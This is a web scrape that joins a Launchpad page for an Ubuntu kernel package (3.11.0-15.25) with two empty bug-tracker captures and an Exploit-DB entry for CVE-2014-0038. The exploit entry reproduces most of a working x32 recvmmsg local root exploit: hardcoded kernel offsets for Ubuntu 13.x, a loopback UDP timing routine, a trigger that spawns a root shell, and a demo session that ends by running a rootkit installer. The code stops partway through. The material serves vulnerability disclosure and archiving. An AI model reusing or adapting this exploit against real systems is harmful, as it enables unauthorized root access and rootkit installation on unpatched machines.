=== Content from launchpad.net_61a4c3c9_20250126_034930.html ===

[Log in / Register](https://launchpad.net/ubuntu/%2Bsource/linux/3.11.0-15.25/%2Blogin)

[![](https://launchpadlibrarian.net/606381979/CoF%2064px.png)](https://launchpad.net/ubuntu)

## [Ubuntu](https://launchpad.net/ubuntu)[linux package](https://launchpad.net/ubuntu/%2Bsource/linux)

* [Overview](https://launchpad.net/ubuntu/%2Bsource/linux)
* [Code](https://code.launchpad.net/ubuntu/%2Bsource/linux)
* [Bugs](https://bugs.launchpad.net/ubuntu/%2Bsource/linux)
* Blueprints
* [Translations](https://translations.launchpad.net/ubuntu/%2Bsource/linux)
* [Answers](https://answers.launchpad.net/ubuntu/%2Bsource/linux)

# linux 3.11.0-15.25 source package in Ubuntu

## Changelog

```
linux (3.11.0-15.25) saucy; urgency=low

  [ John Johansen ]

  * SAUCE: Fix compat_sys_recvmsg on x32 archs
    - LP: [#1274349](/bugs/1274349)
 -- Brad Figg <email address hidden>   Thu, 30 Jan 2014 08:13:36 -0800
```

## Upload details

Uploaded by:
[Brad Figg](/~brad-figg)
on 2014-01-30

Sponsored by:
[Adam Conrad](/~adconrad)

Uploaded to:
[Saucy](/ubuntu/saucy)

Original maintainer:
[Ubuntu Kernel Team](/~kernel-team)

Architectures:
all i386 amd64 armhf arm64 x32 powerpc

Section:
devel

Urgency:
Low Urgency

## [See full publishing history](%2Bpublishinghistory) Publishing

| Series | Pocket | Published | Component | Section |
| --- | --- | --- | --- | --- |

## Builds

[Saucy](/ubuntu/saucy):
![[FULLYBUILT]](/@@/build-success "Successfully built")
[amd64](/~ubuntu-security/%2Barchive/ubuntu/ppa/%2Bbuild/5538489)
![[FULLYBUILT]](/@@/build-success "Successfully built")
[arm64](/~ubuntu-security/%2Barchive/ubuntu/ppa/%2Bbuild/5538490)
![[FULLYBUILT]](/@@/build-success "Successfully built")
[armhf](/~ubuntu-security/%2Barchive/ubuntu/ppa/%2Bbuild/5538491)
![[FULLYBUILT]](/@@/build-success "Successfully built")
[i386](/~ubuntu-security/%2Barchive/ubuntu/ppa/%2Bbuild/5538492)
![[FULLYBUILT]](/@@/build-success "Successfully built")
[powerpc](/~ubuntu-security/%2Barchive/ubuntu/ppa/%2Bbuild/5538493)

## Downloads

| File | Size | SHA-256 Checksum |
| --- | --- | --- |
| [linux\_3.11.0.orig.tar.gz](https://launchpad.net/ubuntu/%2Barchive/primary/%2Bsourcefiles/linux/3.11.0-15.25/linux_3.11.0.orig.tar.gz) | 107.9 MiB | 59904beb1fdae62eb1991f29926c234283c9e4009b6e437499f13d2749bed6ca |
| [linux\_3.11.0-15.25.diff.gz](https://launchpad.net/ubuntu/%2Barchive/primary/%2Bsourcefiles/linux/3.11.0-15.25/linux_3.11.0-15.25.diff.gz) | 3.4 MiB | 86113d40763cddc4ed4c95ade6c98fff8cb7863ebe39780eaa9cbc2c77ec7adc |
| [linux\_3.11.0-15.25.dsc](https://launchpad.net/ubuntu/%2Barchive/primary/%2Bsourcefiles/linux/3.11.0-15.25/linux_3.11.0-15.25.dsc) | 6.5 KiB | 8b86f042f554a184e6ebf5ebb904373b531180c8e6dce6e0c61f0cd2a6caae22 |

### Available diffs

* [diff from 3.11.0-15.23 (in ~canonical-kernel-team/ubuntu/ppa) to 3.11.0-15.25](http://launchpadlibrarian.net/164413732/linux_3.11.0-15.23_3.11.0-15.25.diff.gz) (1.7 MiB)
* [diff from 3.11.0-17.30 (in ~canonical-kernel-team/ubuntu/ppa) to 3.11.0-15.25](http://launchpadlibrarian.net/164399816/linux_3.11.0-17.30_3.11.0-15.25.diff.gz) (1.9 MiB)
* [diff from 3.11.0-15.24 to 3.11.0-15.25](http://launchpadlibrarian.net/164368809/linux_3.11.0-15.24_3.11.0-15.25.diff.gz) (3.3 MiB)

[View changes file](http://launchpadlibrarian.net/164368687/linux_3.11.0-15.25_source.changes)

## Binary packages built by this source

[block-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/block-modules-3.11.0-15-generic-di):
No summary available for block-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for block-modules-3.11.0-15-generic-di in ubuntu saucy.

[block-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/block-modules-3.11.0-15-generic-lpae-di):
No summary available for block-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for block-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[crypto-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/crypto-modules-3.11.0-15-generic-di):
No summary available for crypto-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for crypto-modules-3.11.0-15-generic-di in ubuntu saucy.

[crypto-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/crypto-modules-3.11.0-15-generic-lpae-di):
No summary available for crypto-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for crypto-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[fat-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/fat-modules-3.11.0-15-generic-di):
No summary available for fat-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for fat-modules-3.11.0-15-generic-di in ubuntu saucy.

[fat-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/fat-modules-3.11.0-15-generic-lpae-di):
No summary available for fat-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for fat-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[fb-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/fb-modules-3.11.0-15-generic-di):
No summary available for fb-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for fb-modules-3.11.0-15-generic-di in ubuntu saucy.

[firewire-core-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/firewire-core-modules-3.11.0-15-generic-di):
No summary available for firewire-core-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for firewire-core-modules-3.11.0-15-generic-di in ubuntu saucy.

[floppy-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/floppy-modules-3.11.0-15-generic-di):
No summary available for floppy-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for floppy-modules-3.11.0-15-generic-di in ubuntu saucy.

[fs-core-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/fs-core-modules-3.11.0-15-generic-di):
No summary available for fs-core-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for fs-core-modules-3.11.0-15-generic-di in ubuntu saucy.

[fs-core-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/fs-core-modules-3.11.0-15-generic-lpae-di):
No summary available for fs-core-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for fs-core-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[fs-secondary-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/fs-secondary-modules-3.11.0-15-generic-di):
No summary available for fs-secondary-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for fs-secondary-modules-3.11.0-15-generic-di in ubuntu saucy.

[fs-secondary-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/fs-secondary-modules-3.11.0-15-generic-lpae-di):
No summary available for fs-secondary-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for fs-secondary-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[input-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/input-modules-3.11.0-15-generic-di):
No summary available for input-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for input-modules-3.11.0-15-generic-di in ubuntu saucy.

[input-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/input-modules-3.11.0-15-generic-lpae-di):
No summary available for input-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for input-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[ipmi-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/ipmi-modules-3.11.0-15-generic-di):
No summary available for ipmi-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for ipmi-modules-3.11.0-15-generic-di in ubuntu saucy.

[ipmi-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/ipmi-modules-3.11.0-15-generic-lpae-di):
No summary available for ipmi-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for ipmi-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[irda-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/irda-modules-3.11.0-15-generic-di):
No summary available for irda-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for irda-modules-3.11.0-15-generic-di in ubuntu saucy.

[irda-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/irda-modules-3.11.0-15-generic-lpae-di):
No summary available for irda-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for irda-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[kernel-image-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/kernel-image-3.11.0-15-generic-di):
No summary available for kernel-image-3.11.0-15-generic-di in ubuntu saucy.

No description available for kernel-image-3.11.0-15-generic-di in ubuntu saucy.

[kernel-image-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/kernel-image-3.11.0-15-generic-lpae-di):
No summary available for kernel-image-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for kernel-image-3.11.0-15-generic-lpae-di in ubuntu saucy.

[linux-doc](/ubuntu/saucy/%2Bpackage/linux-doc):
No summary available for linux-doc in ubuntu saucy.

No description available for linux-doc in ubuntu saucy.

[linux-headers-3.11.0-15](/ubuntu/saucy/%2Bpackage/linux-headers-3.11.0-15):
No summary available for linux-headers-3.11.0-15 in ubuntu saucy.

No description available for linux-headers-3.11.0-15 in ubuntu saucy.

[linux-headers-3.11.0-15-generic](/ubuntu/saucy/%2Bpackage/linux-headers-3.11.0-15-generic):
No summary available for linux-headers-3.11.0-15-generic in ubuntu saucy.

No description available for linux-headers-3.11.0-15-generic in ubuntu saucy.

[linux-headers-3.11.0-15-generic-lpae](/ubuntu/saucy/%2Bpackage/linux-headers-3.11.0-15-generic-lpae):
No summary available for linux-headers-3.11.0-15-generic-lpae in ubuntu saucy.

No description available for linux-headers-3.11.0-15-generic-lpae in ubuntu saucy.

[linux-image-3.11.0-15-generic](/ubuntu/saucy/%2Bpackage/linux-image-3.11.0-15-generic):
No summary available for linux-image-3.11.0-15-generic in ubuntu saucy.

No description available for linux-image-3.11.0-15-generic in ubuntu saucy.

[linux-image-3.11.0-15-generic-lpae](/ubuntu/saucy/%2Bpackage/linux-image-3.11.0-15-generic-lpae):
No summary available for linux-image-3.11.0-15-generic-lpae in ubuntu saucy.

No description available for linux-image-3.11.0-15-generic-lpae in ubuntu saucy.

[linux-image-extra-3.11.0-15-generic](/ubuntu/saucy/%2Bpackage/linux-image-extra-3.11.0-15-generic):
No summary available for linux-image-extra-3.11.0-15-generic in ubuntu saucy.

No description available for linux-image-extra-3.11.0-15-generic in ubuntu saucy.

[linux-libc-dev](/ubuntu/saucy/%2Bpackage/linux-libc-dev):
No summary available for linux-libc-dev in ubuntu saucy.

No description available for linux-libc-dev in ubuntu saucy.

[linux-source-3.11.0](/ubuntu/saucy/%2Bpackage/linux-source-3.11.0):
No summary available for linux-source-3.11.0 in ubuntu saucy.

No description available for linux-source-3.11.0 in ubuntu saucy.

[linux-tools-3.11.0-15](/ubuntu/saucy/%2Bpackage/linux-tools-3.11.0-15):
No summary available for linux-tools-3.11.0-15 in ubuntu saucy.

No description available for linux-tools-3.11.0-15 in ubuntu saucy.

[linux-tools-3.11.0-15-generic](/ubuntu/saucy/%2Bpackage/linux-tools-3.11.0-15-generic):
No summary available for linux-tools-3.11.0-15-generic in ubuntu saucy.

No description available for linux-tools-3.11.0-15-generic in ubuntu saucy.

[linux-tools-3.11.0-15-generic-lpae](/ubuntu/saucy/%2Bpackage/linux-tools-3.11.0-15-generic-lpae):
No summary available for linux-tools-3.11.0-15-generic-lpae in ubuntu saucy.

No description available for linux-tools-3.11.0-15-generic-lpae in ubuntu saucy.

[linux-tools-common](/ubuntu/saucy/%2Bpackage/linux-tools-common):
No summary available for linux-tools-common in ubuntu saucy.

No description available for linux-tools-common in ubuntu saucy.

[linux-udebs-generic](/ubuntu/saucy/%2Bpackage/linux-udebs-generic):
No summary available for linux-udebs-generic in ubuntu saucy.

No description available for linux-udebs-generic in ubuntu saucy.

[linux-udebs-generic-lpae](/ubuntu/saucy/%2Bpackage/linux-udebs-generic-lpae):
No summary available for linux-udebs-generic-lpae in ubuntu saucy.

No description available for linux-udebs-generic-lpae in ubuntu saucy.

[md-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/md-modules-3.11.0-15-generic-di):
No summary available for md-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for md-modules-3.11.0-15-generic-di in ubuntu saucy.

[md-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/md-modules-3.11.0-15-generic-lpae-di):
No summary available for md-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for md-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[message-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/message-modules-3.11.0-15-generic-di):
No summary available for message-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for message-modules-3.11.0-15-generic-di in ubuntu saucy.

[mouse-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/mouse-modules-3.11.0-15-generic-di):
No summary available for mouse-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for mouse-modules-3.11.0-15-generic-di in ubuntu saucy.

[mouse-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/mouse-modules-3.11.0-15-generic-lpae-di):
No summary available for mouse-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for mouse-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[multipath-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/multipath-modules-3.11.0-15-generic-di):
No summary available for multipath-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for multipath-modules-3.11.0-15-generic-di in ubuntu saucy.

[multipath-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/multipath-modules-3.11.0-15-generic-lpae-di):
No summary available for multipath-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for multipath-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[nfs-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/nfs-modules-3.11.0-15-generic-di):
No summary available for nfs-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for nfs-modules-3.11.0-15-generic-di in ubuntu saucy.

[nfs-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/nfs-modules-3.11.0-15-generic-lpae-di):
No summary available for nfs-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for nfs-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[nic-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/nic-modules-3.11.0-15-generic-di):
No summary available for nic-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for nic-modules-3.11.0-15-generic-di in ubuntu saucy.

[nic-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/nic-modules-3.11.0-15-generic-lpae-di):
No summary available for nic-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for nic-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[nic-pcmcia-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/nic-pcmcia-modules-3.11.0-15-generic-di):
No summary available for nic-pcmcia-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for nic-pcmcia-modules-3.11.0-15-generic-di in ubuntu saucy.

[nic-shared-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/nic-shared-modules-3.11.0-15-generic-di):
No summary available for nic-shared-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for nic-shared-modules-3.11.0-15-generic-di in ubuntu saucy.

[nic-shared-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/nic-shared-modules-3.11.0-15-generic-lpae-di):
No summary available for nic-shared-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for nic-shared-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[nic-usb-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/nic-usb-modules-3.11.0-15-generic-di):
No summary available for nic-usb-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for nic-usb-modules-3.11.0-15-generic-di in ubuntu saucy.

[nic-usb-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/nic-usb-modules-3.11.0-15-generic-lpae-di):
No summary available for nic-usb-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for nic-usb-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[parport-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/parport-modules-3.11.0-15-generic-di):
No summary available for parport-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for parport-modules-3.11.0-15-generic-di in ubuntu saucy.

[parport-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/parport-modules-3.11.0-15-generic-lpae-di):
No summary available for parport-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for parport-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[pata-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/pata-modules-3.11.0-15-generic-di):
No summary available for pata-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for pata-modules-3.11.0-15-generic-di in ubuntu saucy.

[pcmcia-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/pcmcia-modules-3.11.0-15-generic-di):
No summary available for pcmcia-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for pcmcia-modules-3.11.0-15-generic-di in ubuntu saucy.

[pcmcia-storage-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/pcmcia-storage-modules-3.11.0-15-generic-di):
No summary available for pcmcia-storage-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for pcmcia-storage-modules-3.11.0-15-generic-di in ubuntu saucy.

[plip-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/plip-modules-3.11.0-15-generic-di):
No summary available for plip-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for plip-modules-3.11.0-15-generic-di in ubuntu saucy.

[plip-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/plip-modules-3.11.0-15-generic-lpae-di):
No summary available for plip-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for plip-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[ppp-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/ppp-modules-3.11.0-15-generic-di):
No summary available for ppp-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for ppp-modules-3.11.0-15-generic-di in ubuntu saucy.

[ppp-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/ppp-modules-3.11.0-15-generic-lpae-di):
No summary available for ppp-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for ppp-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[sata-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/sata-modules-3.11.0-15-generic-di):
No summary available for sata-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for sata-modules-3.11.0-15-generic-di in ubuntu saucy.

[sata-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/sata-modules-3.11.0-15-generic-lpae-di):
No summary available for sata-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for sata-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[scsi-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/scsi-modules-3.11.0-15-generic-di):
No summary available for scsi-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for scsi-modules-3.11.0-15-generic-di in ubuntu saucy.

[scsi-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/scsi-modules-3.11.0-15-generic-lpae-di):
No summary available for scsi-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for scsi-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[serial-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/serial-modules-3.11.0-15-generic-di):
No summary available for serial-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for serial-modules-3.11.0-15-generic-di in ubuntu saucy.

[speakup-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/speakup-modules-3.11.0-15-generic-di):
No summary available for speakup-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for speakup-modules-3.11.0-15-generic-di in ubuntu saucy.

[speakup-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/speakup-modules-3.11.0-15-generic-lpae-di):
No summary available for speakup-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for speakup-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[squashfs-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/squashfs-modules-3.11.0-15-generic-di):
No summary available for squashfs-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for squashfs-modules-3.11.0-15-generic-di in ubuntu saucy.

[squashfs-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/squashfs-modules-3.11.0-15-generic-lpae-di):
No summary available for squashfs-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for squashfs-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[storage-core-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/storage-core-modules-3.11.0-15-generic-di):
No summary available for storage-core-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for storage-core-modules-3.11.0-15-generic-di in ubuntu saucy.

[storage-core-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/storage-core-modules-3.11.0-15-generic-lpae-di):
No summary available for storage-core-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for storage-core-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[usb-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/usb-modules-3.11.0-15-generic-di):
No summary available for usb-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for usb-modules-3.11.0-15-generic-di in ubuntu saucy.

[usb-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/usb-modules-3.11.0-15-generic-lpae-di):
No summary available for usb-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for usb-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[virtio-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/virtio-modules-3.11.0-15-generic-di):
No summary available for virtio-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for virtio-modules-3.11.0-15-generic-di in ubuntu saucy.

[vlan-modules-3.11.0-15-generic-di](/ubuntu/saucy/%2Bpackage/vlan-modules-3.11.0-15-generic-di):
No summary available for vlan-modules-3.11.0-15-generic-di in ubuntu saucy.

No description available for vlan-modules-3.11.0-15-generic-di in ubuntu saucy.

[vlan-modules-3.11.0-15-generic-lpae-di](/ubuntu/saucy/%2Bpackage/vlan-modules-3.11.0-15-generic-lpae-di):
No summary available for vlan-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

No description available for vlan-modules-3.11.0-15-generic-lpae-di in ubuntu saucy.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from bugzilla.novell.com_c37c9fdb_20250126_034934.html ===




=== Content from bugzilla.novell.com_1f733916_20250126_034926.html ===




=== Content from www.exploit-db.com_19dadfd1_20250124_220339.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG\_X86\_X32=y' Local Privilege Escalation (3)

#### EDB-ID:

###### 31347

#### CVE:

###### [2014-0038](https://nvd.nist.gov/vuln/detail/CVE-2014-0038)

---

**EDB Verified:**

#### Author:

###### [rebel](/?author=6895)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Linux\_x86-64](/?platform=linux_x86-64)

#### Date:

###### 2014-02-02

---

**Vulnerable App:**

```
/*
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
recvmmsg.c - linux 3.4+ local root (CONFIG_X86_X32=y)
CVE-2014-0038 / x32 ABI with recvmmsg
by rebel @ irc.smashthestack.org
-----------------------------------

takes about 13 minutes to run because timeout->tv_sec is decremented
once per second and 0xff*3 is 765.

some things you could do while waiting:
  * watch http://www.youtube.com/watch?v=OPyZGCKu2wg 3 times
  * read https://wiki.ubuntu.com/Security/Features and smirk a few times
  * brew some coffee
  * stare at the countdown giggly with anticipation

could probably whack the high bits of some pointer with nanoseconds,
but that would require a bunch of nulls before the pointer and then
reading an oops from dmesg which isn't that elegant.

&net_sysctl_root.permissions is nice because it has 16 trailing nullbytes

hardcoded offsets because I only saw this on ubuntu & kallsyms is protected
anyway..

same principle will work on 32bit but I didn't really find any major
distros shipping with CONFIG_X86_X32=y

user@ubuntu:~$ uname -a
Linux ubuntu 3.11.0-15-generic #23-Ubuntu SMP Mon Dec 9 18:17:04 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
user@ubuntu:~$ gcc recvmmsg.c -o recvmmsg
user@ubuntu:~$ ./recvmmsg
byte 3 / 3.. ~0 secs left.
w00p w00p!
# id
uid=0(root) gid=0(root) groups=0(root)
# sh phalanx-2.6b-x86_64.sh
unpacking..

:)=

greets to my homeboys kaliman, beist, capsl & all of #social

Sat Feb  1 22:15:19 CET 2014
% rebel %
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
*/

#define _GNU_SOURCE
#include <netinet/ip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/utsname.h>

#define __X32_SYSCALL_BIT 0x40000000
#undef __NR_recvmmsg
#define __NR_recvmmsg (__X32_SYSCALL_BIT + 537)
#define VLEN 1
#define BUFSIZE 200

int port;

struct offset {
    char *kernel_version;
    unsigned long dest; // net_sysctl_root + 96
    unsigned long original_value; // net_ctl_permissions
    unsigned long prepare_kernel_cred;
    unsigned long commit_creds;
};

struct offset offsets[] = {
    {"3.11.0-15-generic",0xffffffff81cdf400+96,0xffffffff816d4ff0,0xffffffff8108afb0,0xffffffff8108ace0}, // Ubuntu 13.10
    {"3.11.0-12-generic",0xffffffff81cdf3a0,0xffffffff816d32a0,0xffffffff8108b010,0xffffffff8108ad40}, // Ubuntu 13.10
    {"3.8.0-19-generic",0xffffffff81cc7940,0xffffffff816a7f40,0xffffffff810847c0, 0xffffffff81084500}, // Ubuntu 13.04
    {NULL,0,0,0,0}
};

void udp(int b) {
    int sockfd;
    struct sockaddr_in servaddr,cliaddr;
    int s = 0xff+1;

    if(fork() == 0) {
        while(s > 0) {
            fprintf(stderr,"\rbyte %d / 3.. ~%d secs left    \b\b\b\b",b+1,3*0xff - b*0xff - (0xff+1-s));
            sleep(1);
            s--;
            fprintf(stderr,".");
        }

        sockfd = socket(AF_INET,SOCK_DGRAM,0);
        bzero(&servaddr,sizeof(servaddr));
        servaddr.sin_family = AF_INET;
        servaddr.sin_addr.s_addr=htonl(INADDR_LOOPBACK);
        servaddr.sin_port=htons(port);
        sendto(sockfd,"1",1,0,(struct sockaddr *)&servaddr,sizeof(servaddr));
        exit(0);
    }

}

void trigger() {
    open("/proc/sys/net/core/somaxconn",O_RDONLY);

    if(getuid() != 0) {
        fprintf(stderr,"not root, ya blew it!\n");
        exit(-1);
    }

    fprintf(stderr,"w00p w00p!\n");
    system("/bin/sh -i");
}

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

// thx bliss
static int __attribute__((regparm(3)))
